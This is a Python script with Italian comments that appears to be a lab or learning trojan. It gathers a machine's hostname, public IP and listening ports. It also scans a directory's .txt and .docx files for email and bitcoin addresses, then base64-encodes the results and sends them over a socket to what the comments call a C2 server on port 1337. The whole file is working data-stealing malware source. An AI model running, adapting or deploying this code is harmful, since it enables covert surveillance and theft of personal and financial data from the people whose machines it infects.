#!/usr/bin/python3
import requests
import socket
import base64
import json
import re
import os


def main():

    files_ext = [".txt", ".docx"]

    # prendi hostname macchina
    hostname = socket.gethostname()

    # prendi public ipv4 address macchina
    headers = {
        "User-Agent": "Mozilla/5.0" }
    public_ip = requests.get("https://ipapi.co/ip", headers = headers).text

    # cerca indirizzi email e bitcoin
    bitcoin_addresses_list = []
    email_addresses_list = []
    for root, subdirs, files in os.walk("/home/kali/Desktop/cyber warfare rat/python-trojan-master/test-data"):
        for file in files:

            file_path = "{}/{}".format(root, file)
            name, ext = os.path.splitext(file_path)

            if ext in files_ext:
                try:
                    file_fd = open(file_path, "r")
                    # leggi il contenuto di ogni file
                    file_contents = file_fd.read().strip()

                    # cerca bitcoin addresses
                    bitcoin_addresses = re.findall(r"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})", file_contents)

                    # cerca email addresses
                    email_addresses = re.findall(r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)

                    # check se trova bitcoin email addr
                    if len(bitcoin_addresses) > 0:
                        bitcoin_addresses_list = bitcoin_addresses_list + bitcoin_addresses
                    if len(email_addresses) > 0:
                        email_addresses_list = email_addresses_list + email_addresses

                    file_fd.close()
                except:
                    pass


    # prendi le porte aperte della macchina
    open_ports = os.popen("netstat -plant | grep -i listen | awk '{print $4}' | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'").read()
    open_ports = open_ports.strip().split("\n")
    
    # codifica dei dati in json da ma mandare al C2 server
    data = {
        "machine_hostname": hostname,
        "machine_ip": public_ip,
        "machine_open_ports": open_ports,
        "bitcoin_addresses_found": bitcoin_addresses_list,
        "email_addresses_found": email_addresses_list
    }

    # base64 encode the json data
    encoded_data = base64.b64encode(json.dumps(data).encode())



    # Mando i dati al server C2

    # creo socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connessione al C2 SERVER sulla porta 1337
    s.connect(("127.0.0.1", 1337))
    s.send(encoded_data)
    s.close()


if __name__ == "__main__":
    main()
